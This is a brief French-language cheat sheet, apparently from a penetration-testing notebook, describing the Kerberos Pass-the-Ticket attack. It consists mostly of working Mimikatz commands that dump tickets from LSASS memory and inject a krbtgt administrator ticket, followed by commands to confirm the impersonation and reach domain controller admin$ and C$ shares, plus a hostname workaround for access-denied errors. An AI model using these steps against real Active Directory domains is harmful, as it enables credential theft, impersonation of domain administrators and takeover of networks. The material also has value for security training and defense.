## Pass The Ticket

[Mimikatz](Mimikatz.md)

Passer le ticket fonctionne en vidant le TGT de la mémoire LSASS (processus de mémoire qui stocke les informations d'identification sur un serveur d'annuaire actif) de la machine.

> Lorsque vous videz les tickets avec mimikatz, cela nous donnera un ticket `.kirbi` qui peut être utilisé pour obtenir l'administrateur de domaine si un ticket d'administrateur de domaine se trouve dans la mémoire LSASS.

> Toujours prendre un ticket administrateur du krbtgt

```sh
sekurlsa::tickets /export
# exportera tous les tickets .kirbi dans le répertoire actuel

kerberos::ptt [0;2f08fb]-2-0-60a10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
# Toujours prendre un ticket administrateur du krbtgt

misc::cmd
# ouvrira une nouvelle invite de commande élevée
```
Ici nous vérifions simplement que nous avons réussi à usurper l'identité du ticket en répertoriant nos tickets en cache.

```sh
klist
# Nous n'utiliserons pas de mimikatz pour le reste de l'attaque.
```

Aores avoir usurpé l'identité du ticket, ce qui nous donne les mêmes droits que le TGT que nous avons usurpez. 

Pour acceder a une machine du domaine:

```sh
dir \\DOMAIN-CONTROLLER\admin$
dir \\Machin-IP\C$
```

## Problème rencontré
Il peut arrive que lorsque nous essayons d’accéder au répertoire `admin$` sur un DC, nous obtenons simplement `« Accès refusé »` !

Pour résoudre ce problème, vous devez utiliser le nom d'hôte du DC

```sh
nltest /dc:CONTROLLER.LOCAL
# win2012dc.CONTROLLER.LOCAL
```

```sh
dir \\win2012dc.CONTROLLER.LOCAL\admin$
```